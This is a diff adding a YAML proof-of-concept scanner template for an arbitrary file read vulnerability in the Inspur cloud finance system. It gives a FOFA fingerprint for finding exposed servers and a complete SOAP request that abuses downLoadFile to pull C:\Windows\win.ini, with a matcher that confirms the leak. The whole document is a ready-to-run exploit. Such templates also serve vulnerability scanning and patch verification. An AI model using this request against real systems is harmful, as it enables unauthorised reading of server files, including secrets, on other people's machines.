@@ -1,0 +1,35 @@
+id: poc-yaml-inspur-purbidsupplementsrv-asmx-anyfile-read
+info:
+  name: 浪潮云财务系统 PurBidSupplementSrv.asmx 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 浪潮云财务系统
+  fofa: body="session/gsprtf/LoginPartial.aspx"
+requests:
+- method: POST
+  path: /cwbase/service/cepp/PurBidSupplementSrv.asmx
+  headers:
+    Content-Type: text/xml; charset=utf-8
+  data: '<?xml version="1.0"?>
+
+    <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+
+    <soap:Body xmlns:m="http://tempuri.org/">
+
+    <m:downLoadFile>
+
+    <m:filePath>C:\Windows\win.ini</m:filePath>
+
+    <m:offset>0</m:offset>
+
+    </m:downLoadFile>
+
+    </soap:Body>
+
+    </soap:Envelope>'
+  expression: "status_code == 200 && \ncontains(base64_decode(regex_find(body,`<downLoadFileResult>(.*?)</downLoadFileResult>`)),\"\
+    bit app support\") &&\ncontains(base64_decode(regex_find(body,`<downLoadFileResult>(.*?)</downLoadFileResult>`)),\"\
+    [files]\") &&\ncontains(content_type,\"text/xml\")\n"
+variables: {}
+transport: http
